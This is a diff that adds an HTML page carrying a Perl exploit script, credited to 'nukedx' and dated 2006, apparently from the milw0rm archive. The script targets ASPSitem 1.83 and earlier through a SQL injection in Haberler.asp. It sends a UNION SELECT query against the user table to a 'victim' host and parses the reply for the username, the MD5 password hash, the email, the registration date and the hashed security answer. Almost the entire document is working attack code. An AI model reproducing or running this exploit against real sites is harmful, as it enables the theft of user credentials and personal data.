@@ -1,0 +1,77 @@
+<html><head><title>ASPSitem <= 1.83 (Haberler.asp) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
+#Method found &amp; Exploit scripted by nukedx
+#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=23
+#Usage: aspsi.pl &lt;host&gt; &lt;path&gt; &lt;userid&gt;
+use IO::Socket;
+if(@ARGV != 3) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print &quot;\n- NukedX Security Advisory Nr.2006-23\r\n&quot;;
+  print &quot;- ASPSitem &lt;= 1.83 Remote SQL Injection Exploit\r\n&quot;;
+}
+sub usage() 
+{
+  header();
+  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt;\r\n&quot;;
+  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
+  print &quot;- &lt;path&gt; -&gt; Path to ASPSitem ex: /aspsitem/\r\n&quot;;
+  print &quot;- &lt;userid&gt; -&gt; ID of user that you want info ex: 1\r\n&quot;;
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $asserver = $ARGV[0];
+  $asserver =~ s/(http:\/\/)//eg;
+  $ashost   = &quot;http://&quot;.$asserver;
+  $asdir    = $ARGV[1];
+  $asport   = &quot;80&quot;;
+  $astar    = &quot;Haberler.asp?haber=devam&amp;id=&quot;;
+  $asxp     = &quot;-1%20UNION%20SELECT%20cevap,id,0,kulladi,sifre,kayittarih,email%20FROM%20uyeler%20where%20id%20like%20&quot;.$ARGV[2];
+  $asreq    = $ashost.$asdir.$astar.$asxp;
+  #Sending data...
+  header();
+  print &quot;- Trying to connect: $asserver\r\n&quot;;
+  $as = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$asserver&quot;, PeerPort =&gt; &quot;$asport&quot;) || die &quot;- Connection failed...\n&quot;;
+  print $as &quot;GET $asreq HTTP/1.1\n&quot;;
+  print $as &quot;Accept: */*\n&quot;;
+  print $as &quot;Referer: $ashost\n&quot;;
+  print $as &quot;Accept-Language: tr\n&quot;;
+  print $as &quot;User-Agent: NukeZilla\n&quot;;
+  print $as &quot;Cache-Control: no-cache\n&quot;;
+  print $as &quot;Host: $asserver\n&quot;;
+  print $as &quot;Connection: close\n\n&quot;;
+  print &quot;- Connected...\r\n&quot;;
+  while ($answer = &lt;$as&gt;) {
+    if ($answer =~ /class=\&quot;tablo_baslik\&quot;&gt;&lt;b&gt;» (.*?)&lt;\/b&gt;&lt;\/td&gt;/) {
+      if ($1 == $ARGV[2]) {
+        print &quot;- Exploit succeed! Getting USERID: $ARGV[2]'s credentials\r\n&quot;;
+      }
+      else { die &quot;- Exploit failed\n&quot;; }     
+    }
+    if ($answer =~ /\&quot; align=\&quot;left\&quot;&gt;(.*?)&lt;/) {
+      print &quot;- Username: $1\r\n&quot;;
+    }
+    if ($answer =~ /Ekleyen&amp;nbsp;&amp;nbsp;\(&lt;b&gt;(.*?)&lt;\/b&gt;\)/) {
+      print &quot;- MD5 HASH of PASSWORD: $1\r\n&quot;;
+    }
+    if ($answer =~ /\| (.*?) ]&lt;br&gt;/) {
+      print &quot;- Regdate: $1\r\n&quot;;
+    }
+    if ($answer =~ /haber=yorum&amp;id=(.*?)\&quot;&gt;Yorumlar/) {
+      print &quot;- Email: $1\r\n&quot;;
+    }
+    if ($answer =~ / Okunma : (.*?) /) {
+      print &quot;- MD5 hash of answer: $1\r\n&quot;;
+      exit();
+    }
+  }
+  #Exploit failed...
+  print &quot;- Exploit failed\n&quot;
+}
+
+#nukedx.com [2006-04-19]
+
+# milw0rm.com [2006-04-19]</pre></html>
